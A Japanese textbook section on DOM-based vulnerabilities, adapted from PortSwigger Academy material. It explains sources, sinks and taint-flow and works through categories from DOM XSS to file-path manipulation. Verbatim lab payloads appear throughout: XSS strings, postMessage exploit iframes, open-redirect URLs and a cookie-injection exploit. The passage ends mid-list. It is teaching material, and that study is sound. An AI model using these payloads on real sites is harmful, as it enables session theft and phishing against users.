# DOMベース脆弱性 — source と sink をたどって攻撃面を見つける

> **この節で分かること**
> - DOMベース脆弱性が「source（源泉）→ sink（吐き出し口）」という汚染フロー（taint-flow）で起きる仕組みを、設計意図から説明できる。
> - 代表的な source（`location`・`document.cookie`・`document.referrer`・`window.name`・web message など）と、被害の種類を決める sink を区別できる。
> - DOM XSS を筆頭に、open redirection・cookie 操作・JavaScript injection・DOM clobbering など多数の派生カテゴリが、同じ枠組みで生まれることを説明できる。
> - 各カテゴリで「攻撃者がどこを突くか」「どの sink を探すか」を、実際の脆弱コードと逐語ペイロードを見ながら判断できる。
> - Burp Suite のスキャナと DOM Invader を使って、canary 文字列で source→sink を可視化する診断ワークフローを自分で回せる。
> - 全カテゴリに共通する根本対策（信頼できない source を sink に流さない、allowlist 検証、CSP）を説明できる。

**元資料**: https://portswigger.net/web-security/dom-based （原典は取得できず二次情報ベース。`portswigger.net` は執筆環境の egress ポリシーで遮断されたため、PortSwigger Web Security Academy の**逐語コピー**を載せた GitHub ミラー〔`Sivnerof/Sources-And-Sinks-Cheatsheet`、`musclebigger/cyber-security-knowledge-engine`、`apuromafo/Academia_Backup`、`frank-leitner/portswigger-websecurity-academy`〕から本文・コード・ペイロードを原文レベルで回収した。2つの独立ミラーが相互一致し、cheatsheet の sink 一覧とも整合するため信頼できる逐語コピーと判断している。）

**関連する節**: DOM XSS のペイロード作成やブラウザのエンコード挙動は、反射型/保存型 XSS を扱う章と合わせて読むと理解が深まる。

---

## 1. なぜ DOMベース脆弱性という枠組みが必要か

### DOM とは何か、なぜ攻撃面になるのか

DOM（Document Object Model, 文書オブジェクトモデル）とは、Web ブラウザがページ上の要素を階層構造（木）として表現したもののこと。JavaScript はこの DOM を読み書きしてページを動的に変える。たとえば「検索ボックスに入れた文字を、そのまま画面のどこかに表示する」ような処理は、JS が DOM を書き換えて実現している。

問題は、**その JS が読み取る入力の一部を、攻撃者が制御できる**という点にある。URL・cookie・他ページから届くメッセージなどは、攻撃者が値を仕込める。PortSwigger の原文はこう定義する（逐語）。

> The Document Object Model (DOM) is a web browser's hierarchical representation of the elements on the page. … DOM-based vulnerabilities arise when a website contains JavaScript that takes an attacker-controllable value, known as a source, and passes it into a dangerous function, known as a sink.

つまり **DOMベース脆弱性とは、サイトの JavaScript が「攻撃者に制御されうる値（source と呼ぶ）」を受け取り、それを「危険な関数（sink と呼ぶ）」に渡すことで生じる脆弱性**のこと。サーバ側ではなく、被害者のブラウザの中で JS が実行される過程で起きるのが特徴だ。

### source と sink、そして taint-flow

この節の中心になる 3 つの用語を、まず定義する。

- **source（源泉）** とは、攻撃者に制御されうるデータを受け取る JavaScript のプロパティのこと。たとえば URL のクエリ文字列を読む `location.search` は代表的な source。
- **sink（吐き出し口）** とは、攻撃者が制御するデータを渡されると望ましくない影響を引き起こしうる、危険な JavaScript 関数または DOM オブジェクトのこと。たとえば `eval()` は渡された文字列を JavaScript として実行するので sink。
- **taint-flow（汚染フロー / テイント・フロー）** とは、source から sink へと攻撃者制御データが流れていく経路のこと。「汚染された（tainted）」データが、途中で無害化（検証・エスケープ・サニタイズ）されないまま sink に届くと脆弱性が成立する。

PortSwigger の原文による source の定義（逐語）。

> A source is a JavaScript property that accepts data that is potentially attacker-controlled. An example of a source is the location.search property because it reads input from the query string, which is relatively simple for an attacker to control. Ultimately, any property that can be controlled by the attacker is a potential source. This includes the referring URL (exposed by the document.referrer string), the user's cookies (exposed by the document.cookie string), and web messages.

sink の定義（逐語）。

> A sink is a potentially dangerous JavaScript function or DOM object that can cause undesirable effects if attacker-controlled data is passed to it. For example, the eval() function is a sink because it processes the argument that is passed to it as JavaScript. An example of an HTML sink is document.body.innerHTML because it potentially allows an attacker to inject malicious HTML and execute arbitrary JavaScript.

### 「どの sink に届くか」で被害が変わる

ここが DOMベース脆弱性を理解するうえで一番大事な発想である。source から取り出したデータが**どの sink に流れ込むか**によって、成立する脆弱性の種類が決まる。

```
攻撃者が制御する入力（source）
   │  例: location.search, location.hash, document.cookie, window.name, web message
   ▼
（無害化されないまま流れる ＝ taint-flow）
   │
   ▼
危険な関数・DOMオブジェクト（sink）
   ├─ innerHTML / document.write   → DOM XSS（任意JS実行）
   ├─ location / location.href     → open redirection（外部サイトへ誘導）
   ├─ document.cookie              → cookie 操作（session fixation 等）
   ├─ eval / setTimeout            → JavaScript injection
   ├─ WebSocket コンストラクタ       → WebSocket-URL poisoning
   └─ … sink の種類だけ被害の種類がある
```

攻撃者の基本戦術は共通している。**脆弱なページに被害者を誘導する URL を作り、ペイロードを URL のクエリ文字列やフラグメント（`#` 以降）に仕込む**。被害者がその URL を開くと、ページの JS が source からペイロードを読み、sink に渡してしまう。

> ### 📌 ここは自分で開いて読んでください
> **資料**: DOM-based vulnerabilities（PortSwigger Web Security Academy、トップページ）— https://portswigger.net/web-security/dom-based
> **なぜ**: 本教科書の執筆環境からは自動取得できなかった（理由: `portswigger.net` が組織の egress プロキシで遮断され、`web.archive.org` などの代替ミラーも同様に 403 で拒否された）。以下の記述は、内容を逐語コピーした GitHub ミラー（`Sivnerof/Sources-And-Sinks-Cheatsheet`、`musclebigger/cyber-security-knowledge-engine`、`apuromafo/Academia_Backup`）から原文レベルで回収した本文にもとづく。
> **読みどころ**:
> 1. source と sink の公式定義（本節 §1 に逐語収録済み）。ここが全カテゴリの土台になる。
> 2. 16カテゴリと「代表 sink」の一覧表（本節 §3 に再現済み）。原典で最新の対応を確認する。
> 3. 「How to prevent DOM-based taint-flow vulnerabilities」の節（本節 §22 に逐語収録）。共通対策の原文。
> 4. 各カテゴリへのリンク集。ここが 16 サブページの入口になっている。
> **代替手段**: 全 sink 一覧を逐語で読める `https://raw.githubusercontent.com/Sivnerof/Sources-And-Sinks-Cheatsheet/main/README.md`、および本文を原文で読める `https://raw.githubusercontent.com/musclebigger/cyber-security-knowledge-engine/main/data/knowledge-base/dom-based/README.md`。

---

## 2. 代表的な source 一覧

多様な taint-flow 脆弱性の exploit に使える典型的な source は次の通り（cheatsheet より逐語）。バグハンティングでは、まずこれらのプロパティを JavaScript コード中から探し、「どこで読まれ、その値がどこへ流れるか」を追う。

| 分類 | source |
|---|---|
| URL 系 | `document.URL`, `document.documentURI`, `document.URLUnencoded`, `document.baseURI`, `location` |
| ブラウザ状態 | `document.cookie`, `document.referrer`, `window.name` |
| 履歴 API | `history.pushState`, `history.replaceState` |
| ストレージ | `localStorage`, `sessionStorage`, `IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)`, `Database` |

補足として、`location` は総称であり、実際には次のような細かいプロパティを含む。

- `location.search` — クエリ文字列（`?a=b` の部分）
- `location.hash` — フラグメント（`#` 以降）。フラグメントは通常サーバに送られないため、サーバ側ログに残らず攻撃の証跡を消しやすい点で攻撃者に好まれる。
- `location.href` — URL 全体
- `location.pathname` — パス部分

〔補足〕タスク上よく挙がる `postMessage` や `WebSocket` は、上のリストとは別枠の **web message（受信メッセージ）** という source カテゴリに相当する。web message は `window.addEventListener('message', ...)` の受信ハンドラが受け取る `event.data` が攻撃者制御 source になる（後述 §5）。

---

## 3. 脆弱性カテゴリと「代表 sink」の対応表

PortSwigger は DOM-based トップページで、各脆弱性カテゴリと代表 sink を一覧化している。この表は「どの sink を見たら、どのカテゴリを疑うか」の索引になる。

| DOMベース脆弱性カテゴリ | 代表 sink（example sink） |
|---|---|
| DOM XSS（cross-site scripting） | `document.write()` |
| Open redirection | `window.location` |
| Cookie manipulation | `document.cookie` |
| JavaScript injection | `eval()` |
| Document-domain manipulation | `document.domain` |
| WebSocket-URL poisoning | `WebSocket`（コンストラクタ） |
| Link manipulation | `element.src` |
| Web message manipulation | `postMessage()` |
| Ajax request-header manipulation | `setRequestHeader()` |
| Local file-path manipulation | `FileReader.readAsText()` |
| Client-side SQL injection | `ExecuteSql()` |
| HTML5-storage manipulation | `sessionStorage.setItem()` |
| Client-side XPath injection | `document.evaluate()` |
| Client-side JSON injection | `JSON.parse()` |
| DOM-data manipulation | `element.setAttribute()` |
| Denial of service | `RegExp()` |

以降、カテゴリごとに「発生条件 → 被害 → sink の完全一覧 → 対策」を、実コードとともに見ていく。sink 一覧はすべて cheatsheet からの逐語である。

---

## 4. DOM XSS（DOM-based cross-site scripting）

DOM XSS は DOMベース脆弱性のなかで最も有名で、攻撃力も高い。ここを最初に厚く理解しておくと、他のカテゴリの見方も分かる。

### 発生条件と被害

**発生条件**: スクリプトが source から取り出したデータを、**HTML/JavaScript の実行が可能な sink** に安全でない方法で書き込むと発生する。原文の定義（逐語）。

> DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as `eval()` or `innerHTML`. This enables attackers to execute malicious JavaScript, which typically allows them to hijack other users' accounts.

**被害**: 攻撃者が制御する URL を被害者が開くと、攻撃者の任意 JavaScript が**被害者のブラウザセッションの文脈で**実行される。セッショントークンやログイン認証情報の窃取、被害者になりすました操作、キーロギングなどが可能になる。source は `window.location`（URL）が最も一般的だが、404 ページ狙いや PHP サイトなど特定状況では、ペイロードを URL の path 部分に置けることもある。

### DOM XSS を引き起こす sink の完全一覧（cheatsheet 逐語）

素の DOM API の sink。

```text
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent
```

jQuery を使っている場合、次の関数群も sink になる。

```text
add()      after()    append()   animate()
insertAfter()  insertBefore()  before()  html()
prepend()  replaceAll()  replaceWith()  wrap()
wrapInner()  wrapAll()  has()  constructor()
init()  index()  jQuery.parseHTML()  $.parseHTML()
```

### テスト手法 — HTML sink

DOM XSS を見つける基本作業は「canary（目印）文字列を source に入れ、それが DOM のどこに現れるかを追う」ことである。原文の手順（逐語）。

> To test for DOM XSS in an HTML sink, place a random alphanumeric string into the source (such as `location.search`), then use developer tools to inspect the HTML and find where your string appears. Note that the browser's "View source" option won't work for DOM XSS testing because it doesn't take account of changes that have been performed in the HTML by JavaScript. In Chrome's developer tools, you can use `Control+F` … to search the DOM for your string.

ここで初学者が必ずつまずくのが **「ページのソースを表示（View source）」が使えない**という点。View source はサーバから届いた生の HTML を見せるだけで、**JavaScript が後から書き換えた DOM を反映しない**。DOM XSS は JS が DOM を書き換えた結果として起きるので、必ず開発者ツールの Elements（DOM 検査）で確認する。Chrome なら `Control+F` で DOM から文字列を検索できる。

文字列が現れた各箇所で、その**文脈**（属性の中か、タグの中か、テキストノードか）を特定し、その文脈から抜け出せる（break out できる）かを試す。たとえば二重引用符の属性値の中に落ちているなら、`"` を注入して属性を閉じられるか検証する。

〔ブラウザ差の注意（逐語要旨）〕Chrome/Firefox/Safari は `location.search`・`location.hash` を URL エンコードするため、記号がそのまま sink に届かず XSS が成立しにくいことがある。一方 IE11 と（Chromium 化する前の）Edge はエンコードしなかった。ここは環境で挙動が変わるので、複数ブラウザで確認する価値がある。

### テスト手法 — JavaScript 実行 sink

`eval()` や `setTimeout()` のような JavaScript 実行 sink では、入力が DOM 上に文字列として現れないため検索では見つけられない。原文の手順（逐語要旨）: `Control+Shift+F` でページの全 JavaScript から source（`location` など）の参照箇所を探し、**JavaScript デバッガでブレークポイント**を置き、値が別の変数に代入されながら sink へ流れる経路を追う。sink 到達直前で変数にホバーして実際の値を確認し、入力を精緻化する。

### Exploit のコツ — document.write と innerHTML の差

sink の種類でペイロードの書き方が変わる。ここは頻出なので原文コードで押さえる。

- **`document.write`** は `<script>` 要素をそのまま使える（逐語）。

```javascript
document.write('... <script>alert(document.domain)</script> ...');
```

周囲の文脈によっては、既存の要素を閉じてからペイロードを置く必要がある。

- **`innerHTML`** はモダンブラウザで `<script>` を実行してくれず、`<svg onload>` も発火しない。そこで `<img>` や `<iframe>` の `onerror`/`onload` イベントを使う（逐語）。

```javascript
element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'
```

### jQuery と AngularJS の落とし穴

**jQuery の `attr()`** で `href` 属性を source から書き換える古典的な脆弱コード（逐語）。

```javascript
$(function() {
  $('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
});
```

この場合、`returnUrl` に `javascript:` 疑似プロトコルを入れると、リンククリックで JS が走る（逐語）。

```text
?returnUrl=javascript:alert(document.domain)
```

**`$()` セレクタ + `location.hash`** も古典的な脆弱パターン（逐語）。

```javascript
$(window).on('hashchange', function() {
  var element = $(location.hash);
  element[0].scrollIntoView();
});
```

新しめの jQuery は `#` で始まる入力での HTML 注入をパッチ済みだが、`#` プレフィックスが不要な source から `$()` の入力を完全に制御できれば依然として脆弱になりうる。ユーザー操作なしで `hashchange` を発火させる最も簡単な手段は iframe である（逐語）。

```html
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

**AngularJS**: `ng-app` 属性を持つ要素の内側では、AngularJS が **二重波括弧 `{{ }}` の中の JavaScript を、山括弧やイベント属性が無くても**評価する。テンプレートに source が反映されると client-side template injection から XSS になる。

### 反射型/保存型データと組み合わさる DOM XSS

source はブラウザが直接公開するものだけではない。**サーバが URL パラメータを HTML 応答に反映**し、その反映値をページの JS が sink に書くと、reflected/stored DOM XSS になる（逐語）。

```javascript
eval('var data = "reflected string"');   // reflected DOM XSS
element.innerHTML = comment.author;       // stored DOM XSS
```

### 対策（逐語要旨）

- 最も効果的なのは、**信頼できない source のデータを HTML ドキュメントに動的に書き込まない**こと。
- 避けられない場合は、文脈に応じた出力エンコードを行い、`innerHTML` ではなく `textContent`/`innerText` を使う。
- **CSP（Content Security Policy, コンテンツセキュリティポリシー）** を影響緩和策として併用する。CSP とは、実行を許可するスクリプトの出所などをブラウザに指示するヘッダのこと。
- 自動検出には **Burp Suite の Web脆弱性スキャナ**が有効で、JavaScript の静的解析と動的解析を組み合わせて高信頼に検出する。

> ### 📌 ここは自分で開いて読んでください
> **資料**: DOM-based cross-site scripting（PortSwigger、DOM XSS 本編）— https://portswigger.net/web-security/cross-site-scripting/dom-based
> **なぜ**: 本教科書の執筆環境からは自動取得できなかった（理由: `portswigger.net` が egress プロキシで遮断された）。以下の記述は逐語ミラー（`musclebigger/cyber-security-knowledge-engine` の `data/portswigger-academy/web-security__cross-site-scripting__dom-based.md`、抓取時点 2026-09-05）から原文レベルで回収した本文にもとづく。
> **読みどころ**:
> 1. HTML sink のテスト手順（canary 文字列 → 開発者ツールで DOM 検査、View source が使えない理由）。
> 2. jQuery（`attr()`・`$()` セレクタ・`hashchange`）と AngularJS を使った DOM XSS の具体例。
> 3. 反射型/保存型データと組み合わさる DOM XSS の説明。
> 4. apprentice〜practitioner の対応ラボへのリンク（実際に手を動かせる）。
> **代替手段**: ラボの逐語ペイロード付き walkthrough が `https://github.com/frank-leitner/portswigger-websecurity-academy`（`11_cross_site_scripting_XSS/` の DOM 系）にある。

### DOM XSS ラボの逐語ペイロード

以下は、実際のラボ環境で有効だった逐語ペイロードと、その仕組み（frank-leitner walkthrough より全文取得）。**これらは自分で立てた検証環境や許可されたラボでのみ試すこと。**

**(a) `document.write` sink × `location.search`（APPRENTICE）** — 検索語が JS で `<img>` タグの `src` に書き込まれる。埋め込みの前後を破って注入する。

```html
"><script>alert(document.domain)</script>
```

代替（img の属性として注入）。

```text
" onload="alert(document.domain)
```

**(b) `innerHTML` sink × `location.search`（APPRENTICE）** — `search` 引数があると span 要素の `innerHTML` が動的変更される。`<script>` は後付け DOM では実行されないため `onerror` を使う。

```html
foo<img src="xxx" onerror=alert(document.domain)>
```

**(c) `document.write` sink × `<select>` 要素内（PRACTITIONER）** — 在庫確認機能で `&storeId=` の値が `document.write` により `<select>` 内に書かれる。option/select/form を閉じてから script を置く。

```text
&storeId=Milan</option></select></form><script>alert(document.domain)</script>
```

**(d) jQuery anchor `href` 属性 sink × `location.search`（APPRENTICE）** — `/feedback?returnPath=/` の `returnPath` が backLink の `href` に入る。`javascript:` 疑似プロトコルを注入する。

```text
javascript:alert(document.cookie);
```

**(e) jQuery セレクタ sink × `hashchange` イベント（APPRENTICE）** — トップページで `location.hash` を `$()` に渡し該当 post へスクロールする。exploit サーバの iframe で `onload` により hash を変更 → `hashchange` 発火 → `img` の `onerror` で実行。

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=xxx onerror=print()>'"></iframe>
```

（検証用の中間段階では `onerror=alert(document.location)` を使う。）

**(f) AngularJS 式（角括弧と二重引用符が HTML エンコードされる）（PRACTITIONER）** — `ng-app` 直下の検索機能。まず `foobar{{1+2}}` で式評価を確認し、その後 constructor チェーンで JS 実行。

```text
{{constructor.constructor('alert(document.domain)')()}}
```

**(g) Reflected DOM XSS（PRACTITIONER）** — 検索結果が JSON で返り、client 側で `eval` に渡される。サーバは `"` をエスケープするが、`\` を注入すると client 側で `\` がエスケープされ `"` が生きる。

```text
\"};alert(document.domain);//
```

（最初に試した `\"}+alert(document.domain);//` はアラートは出るがアプリが後続でエラーになる。安定版が上。）

**(h) Stored DOM XSS（PRACTITIONER）** — コメント機能。client 側の `escapeHTML` が `<` と `>` を `replace` で置換するが、文字列指定の `replace` は**最初の 1 組しか置換しない**ため、ダミーの `<>` を先頭に置くと後続タグが生き残る。`innerHTML` で挿入されるので `<img onerror>` が有効。

```html
<ignored><img src="xxx" onerror=alert(document.domain)>
```

（失敗版 `<ignored><script>alert(document.domain)</script>` は、DOM 挿入後に script が再パースされないため実行されない。）

---

## 5. Web message 経由の DOM XSS（web message manipulation / controlling the web message source）

### 背景 — postMessage という仕組み

`postMessage()` は、異なるオリジンのウィンドウ（iframe や別タブ）同士が安全にメッセージを送り合うためのブラウザ API である。同一オリジンポリシー（Same-Origin Policy, SOP）で普段は遮断されている越境通信を、明示的に許すための仕組み。しかし受信側の実装が甘いと、これが攻撃経路になる。

原文は送信側と受信側を別ページで扱う。整理すると次の通り。

- **web message manipulation（送信側）**（逐語）: > Web message vulnerabilities arise when a script sends attacker-controllable data as a web message to another document within the browser. sink は `postMessage()`。
- **controlling the web message source（受信側）**: `window.addEventListener('message', ...)` の受信ハンドラが受け取る `event.data` を、無検証で危険な sink（`eval()` など）に渡すパターン。

### 攻撃者はどこを突くか

**発生条件**: web message を受信する **event listener が受信データを安全でなく扱う**、あるいは **受信メッセージの origin を正しく検証していない**と脆弱になる。攻撃者は悪意ある iframe をホストし、`postMessage()` で脆弱な listener にデータを渡し、そのデータが親ページの sink に流れ込む。

無検証リスナーの脆弱コード（逐語）。

```html
<script>
window.addEventListener('message', function(e) {
  eval(e.data);
});
</script>
```

これを突く exploit iframe（逐語）。

```html
<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">
```

リスナーが origin を検証せず、送信側が `targetOrigin` に `"*"` を指定しているため、ペイロードがそのまま `eval()` に渡る。

### origin 検証の「甘い」実装を突く

検証があっても、部分一致でチェックしていると迂回できる。`indexOf` による検証（逐語）。

```javascript
window.addEventListener('message', function(e) {
  if (e.origin.indexOf('normal-website.com') > -1) {
    eval(e.data);
  }
});
```

原文の指摘（逐語）。

> an attacker could easily bypass this verification step if the origin of their malicious message was `http://www.normal-website.com.evil.net`, for example.

つまり `normal-website.com` が origin 文字列のどこかに含まれれば通過するので、`http://www.normal-website.com.evil.net` のような攻撃者ドメインを許してしまう。同じ欠陥は `startsWith()`／`endsWith()` にもある。次のリスナーは `http://www.malicious-websitenormal-website.com` を安全と誤認する（逐語）。

```javascript
window.addEventListener('message', function(e) {
  if (e.origin.endsWith('normal-website.com')) {
    eval(e.data);
  }
});
```

### 対策

- 信頼できない source のデータを含む web message を**送信しない**。
- クロスオリジンで送る際は、**必ず `targetOrigin` に送信先の具体的な origin を明示**する（`"*"` を使わない）。
- 受信メッセージの **origin を堅牢に検証**する。`indexOf`/`startsWith`/`endsWith` のような部分一致ではなく、**完全一致**で判定する。

### web message ラボの逐語ペイロード

**DOM XSS using web messages（PRACTITIONER）** — `message` にペイロード、`targetOrigin` は具体的なドメインを指定する。ペイロードには DOM 挿入後でも実行される `<img>` の `onerror` を用いる。`postMessage` の構文（MDN 逐語）。

```text
postMessage(message, targetOrigin)
postMessage(message, targetOrigin, transfer)
```

**DOM XSS using web messages and JSON.parse（PRACTITIONER）** — 受信 message を `JSON.parse` し、`type` が `load-channel` のとき `url` を iframe に読み込む。`url` に `javascript:` を注入する。

```json
{
    "type": "load-channel", 
    "url": "javascript:print()"
}
```

逐語 exploit HTML（3 層のクォートをエスケープしている。JSON RFC 7159 は JSON 内の文字列に二重引用符を要求するため）。

```html
<iframe 
    src="https://YOUR-LAB-ID.web-security-academy.net/" 
    onload='contentWindow.postMessage("{\"type\": \"load-channel\", \"url\": \"javascript:print()\"}","*");'
></iframe>
```

**DOM XSS using web messages and a JavaScript URL（PRACTITIONER）** — message に `http:`／`https:` が含まれると `location` をその値へリダイレクトする実装。文字列のどこか（JS コメント内でも可）に `https:` を含めれば検証を通過し、`javascript:` を実行できる。exploit HTML の骨格。

```html
<iframe src="URL" onload="contentWindow.postMessage('PAYLOAD','*');">
```

ペイロードは実ペイロード `javascript:print();` と、検証通過用コメント `/*https:*/` の組み合わせにする。

---

## 6. DOM-based open redirection

**発生条件**（逆語）: > let url = /https?:\/\/.+/.exec(location.hash); のように、スクリプトが攻撃者制御データを、**クロスドメインのナビゲーションを引き起こせる sink** に書き込むと発生する。原文の脆弱コード例（逐語）。

```javascript
let url = /https?:\/\/.+/.exec(location.hash);
if (url) {
  location = url[0];
}
```

もう一つの原文コード例（`location.hash` を `startsWith` でチェックしてから `location` に代入。逐語）。

```javascript
goto = location.hash.slice(1)
if (goto.startsWith('https:')) {
  location = goto;
}
```

攻撃 URL の逐語例。

```text
https://www.innocent-website.com/example#https://www.evil-user.net
```

被害者がこの URL を開くと `location` が `https://www.evil-user.net` に設定され、悪性サイトへ自動リダイレクトされる。

**被害**: 任意の外部 URL へ遷移させられる URL を作れる。正当なアプリのドメイン・有効な TLS 証明書を使えるため、**フィッシングに信頼性を与える**のが怖い点。さらに、攻撃者がリダイレクト先文字列の**先頭**を制御できれば、`javascript:` 疑似プロトコルで **JavaScript injection（＝XSS）へ格上げ**できる。

**Open redirection sink 完全一覧（cheatsheet 逐語）**。

```text
location            location.host      location.hostname
location.href       location.pathname  location.search
location.protocol   location.assign()  location.replace()
open()              element.srcdoc     XMLHttpRequest.open()
XMLHttpRequest.send()  jQuery.ajax()   $.ajax()
```

**対策**: 信頼できない source のデータでリダイレクト先を動的に設定しない。避けられない場合は、**許可 URL の許可リスト（allowlist / whitelist）** を使い、遷移前にターゲットを厳格に検証する。

**ラボ逐語（DOM-based open redirection, PRACTITIONER）**: 各ブログ記事下のリンクが、`url` パラメータが無ければ `/` へ、あれば `http://`/`https://` で始まる `url` 値を遷移先にする（無検証）。悪意ある URL。

```text
https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&url=https://exploit-YOUR-EXPLOIT-ID.web-security-academy.net/exploit
```

---

## 7. DOM-based cookie manipulation

**発生条件**（逐語）: > DOM-based cookie-manipulation vulnerabilities arise when a script writes attacker-controllable data into the value of a cookie. スクリプトが攻撃者制御データを cookie の値に書くと発生する。sink は `document.cookie`。

典型的な脆弱コード（逐語）。

```javascript
document.cookie = 'cookieName='+location.hash.slice(1);
```

**被害**:
- cookie がセッション追跡に使われる場合、攻撃者が入手した正当トークンを cookie に設定して被害者に使わせる **session fixation（セッション固定）** 攻撃ができる。session fixation とは、攻撃者が用意したセッション ID を被害者に使わせ、被害者ログイン後にそのセッションを攻撃者が乗っ取る手口のこと。
- cookie が挙動制御（例: 'production' 対 'demo' モード）に使われる場合、cookie 値を操作して被害者に意図しない動作をさせられる。
- さらに原文は「**脆弱サイトだけでなく同一親ドメイン配下の他サイトも攻撃対象になりうる**」と指摘。cookie を HTML エンコードせず反映するサイトでは、cookie 操作から XSS にもつながる。

**対策**: 信頼できない source のデータを cookie に書かない。避けられない場合は allowlist で検証。

**ラボ逐語（DOM-based cookie manipulation, PRACTITIONER）**: 商品ページのスクリプトが現在ページの URL を無検証で cookie に保存し、「Last viewed product」リンクに反映される。攻撃 URL（有効な商品 URL を保ちつつペイロードを付与）。

```text
https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&evil='><script>alert(document.domain)</script>
```

exploit HTML（iframe を仕込み、`setTimeout` でリロードして cookie を送信 ＝ スクリプトを発火させる）。

```html
<iframe name="victim" id="victim"
    src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" 
></iframe>
<script>
setTimeout(() => {  document.getElementsByName('victim')[0].src = "https://YOUR-LAB-ID.web-security-academy.net"}, 500);
</script>
```

---

## 8. DOM-based JavaScript injection

**発生条件**（逐語）: > DOM-based JavaScript-injection vulnerabilities arise when a script executes attacker-controllable data as JavaScript. スクリプトが攻撃者制御データを **JavaScript として実行**すると発生する。

**被害**: 攻撃者制御 URL を被害者が開くと、被害者ブラウザセッションの文脈で任意 JavaScript が実行される。セッショントークンや認証情報の窃取、なりすまし操作、キーロギングなど広範な操作が可能。

**JavaScript injection sink 完全一覧（cheatsheet 逐語）**。

```text
eval()                 Function()             setTimeout()
setInterval()          setImmediate()         execCommand()
execScript()           msSetImmediate()       range.createContextualFragment()
crypto.generateCRMFRequest()
```

**対策**: 信頼できない source のデータを JavaScript として実行させない。

---

## 9. DOM-based document-domain manipulation

### 背景 — document.domain と同一オリジンポリシー

`document.domain` プロパティは、ブラウザの **同一オリジンポリシー（Same-Origin Policy, SOP）** の適用に使われてきた歴史的な仕組み。SOP とは、あるオリジン（スキーム＋ホスト＋ポートの組）のページが、別オリジンの資源に勝手にアクセスするのを禁じるブラウザの基本ルールのこと。異なるオリジンの 2 ページが**明示的に同じ `document.domain` を設定する**と、その 2 ページは無制限に相互作用できるようになる。

**発生条件**（逐語）: > Document-domain manipulation vulnerabilities arise when a script uses attacker-controllable data to set the `document.domain` property. スクリプトが攻撃者制御データで `document.domain` を設定すると発生する。sink は `document.domain`。

**攻撃者はどこを突くか**: 攻撃者が標的ページと自分の制御ページを同一の `document.domain` に揃えられれば、既に制御しているページ経由で標的ページを完全に掌握でき、**通常の XSS とほぼ同等の悪用可能性**を持つ。ブラウザは設定できる値に制約を課すが、①**子ドメイン・親ドメインへの変更は許可**されるため弱い関連サイトへ切り替えられる、②一部ブラウザのクセで無関係なドメインへ切り替えられる場合がある、という抜け穴がある。

**対策**: 信頼できない source のデータで `document.domain` を動的設定しない。プログラム的に設定が必要なら、許容値の固定リストを用意し、その中の値のみ代入する。

〔補足〕`document.domain` による SOP 緩和は非推奨化が進み、モダンブラウザでは既定で無効化・不可となる方向にある。

---

## 10. DOM-based WebSocket-URL poisoning

**発生条件**（逐語）: > WebSocket-URL poisoning occurs when a script uses controllable data as the target URL of a WebSocket connection. スクリプトが制御可能データを WebSocket 接続のターゲット URL に使うと発生する。sink は `WebSocket` コンストラクタ。

**被害**: 被害者が開くと、被害者ブラウザが**攻撃者制御の URL へ WebSocket 接続**を開いてしまう URL を作れる。サイトが機微データを WebSocket サーバへ送るなら攻撃者がそれを捕捉でき、サーバからのデータを処理するならロジック改変やクライアント側攻撃の配送に使われる。

**対策**: 信頼できない source のデータで WebSocket 接続先 URL を動的設定しない。避けられない場合は許可 URL の whitelist で厳格検証。WebSocket エンドポイント URL は**ハードコード**し、ユーザー制御データを URL に混ぜない。

---

## 11. DOM-based link manipulation

**発生条件**（逐語）: > DOM-based link-manipulation vulnerabilities arise when a script writes attacker-controllable data to a navigation target within the current page, such as a clickable link or the submission URL of a form. スクリプトが攻撃者制御データを、**ページ内のナビゲーション先**（クリック可能なリンクやフォームの送信先 URL など）に書き込むと発生する。

**被害（原文は 4 点を挙げる。逐語要旨）**:
1. 任意外部 URL への誘導（フィッシング）。
2. 機微なフォームデータを攻撃者サーバへ送信させる。
3. リンクのファイル/クエリ文字列を変え、アプリ内の意図しない動作を誘発する。
4. オンサイトリンクに XSS を仕込み、**ブラウザの anti-XSS 防御を回避**する（anti-XSS は通常オンサイトのリンクを考慮しないため）。

**Link manipulation sink 完全一覧（cheatsheet 逐語）**。

```text
element.href
element.src
element.action
```

**対策**: 信頼できない source のデータで遷移先 URL を動的設定しない。避けられない場合は許可 URL の whitelist で厳格検証。

〔補足〕関連する reverse tabnabbing（`target=_blank` で開いた先が元タブを乗っ取る手口）は、現在のモダン（evergreen）ブラウザでは自動的に防止される。`target=_blank` に暗黙で `noopener` が付与されるためである。

---

## 12. DOM-based AJAX request-header manipulation

**発生条件**（逐語）: > Ajax request-header manipulation vulnerabilities arise when a script writes attacker-controllable data into the request header of an Ajax request that is issued using an `XmlHttpRequest` object. スクリプトが攻撃者制御データを、`XMLHttpRequest` で発行する AJAX リクエストの**リクエストヘッダ**に書き込むと発生する。

**被害**: 影響は当該ヘッダがサーバ側処理で果たす役割に依存する。ヘッダが AJAX リクエストの結果挙動を制御している場合、ヘッダ操作で被害者に意図しない動作をさせられる可能性があり、他の攻撃と連鎖する起点にもなる。

**AJAX request-header manipulation sink 完全一覧（cheatsheet 逐語）**。

```text
XMLHttpRequest.setRequestHeader()
XMLHttpRequest.open()
XMLHttpRequest.send()
jQuery.globalEval()
$.globalEval()
```

**対策**: 信頼できない source のデータで AJAX リクエストヘッダを動的設定しない。

---

## 13. DOM-based local file-path manipulation

**発生条件**（逐語）: > Local file-path manipulation vulnerabilities arise when a script passes attacker-controllable data to a file-handling API as the `filename` parameter. スクリプトが攻撃者制御データを、ファイル処理 API の **filename パラメータ**として渡すと発生する。

**被害**: 被害者が開くと、被害者ブラウザが**任意のローカルファイルを開いてしまう**URL を作れる。サイトがファイルを読むなら攻撃者がデータを窃取でき、書くなら攻撃者が任意データを書き込める（例: OS 設定ファイル）。実際の悪用は他の適切な機能の存在に依存する。

**Local file-path manipulation sink 完全一覧（cheatsheet 逐語）**。

```text
